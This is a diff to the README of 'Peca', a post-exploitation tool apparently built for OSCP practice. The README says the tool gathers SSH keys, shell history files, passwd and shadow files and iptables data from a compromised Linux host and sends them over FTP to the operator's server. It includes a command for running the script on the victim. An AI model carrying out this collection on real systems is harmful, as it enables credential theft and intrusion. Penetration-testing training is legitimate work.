@@ -12,8 +12,15 @@ Note: For educational use only
 ```
 ##### Intro:
     Peca was designed to help collect key files from linux 
-    machines after exploitation has occured.
-    
+    machines after exploitation has occured. Originally
+    designed to help with data gathering during the OSCP
+
+##### Features:
+	* Collects all ssh keys in root/usershome
+	* Collects .bash* related files for same
+	* Collects passwd/shadow files from machine
+	* Collects IPTable data
+
 ##### Use:
 
 Simple start the server *Sudo is needed for port 21*
@@ -24,4 +31,9 @@ Simple start the server *Sudo is needed for port 21*
 Then drop the peca script on the client
 ```
     ./peca.py --server <iphere> --port 21 --user user --password user
+```
+
+##### Technical:
+```
+	Communicates utilizing the ftp protocol.
 ```
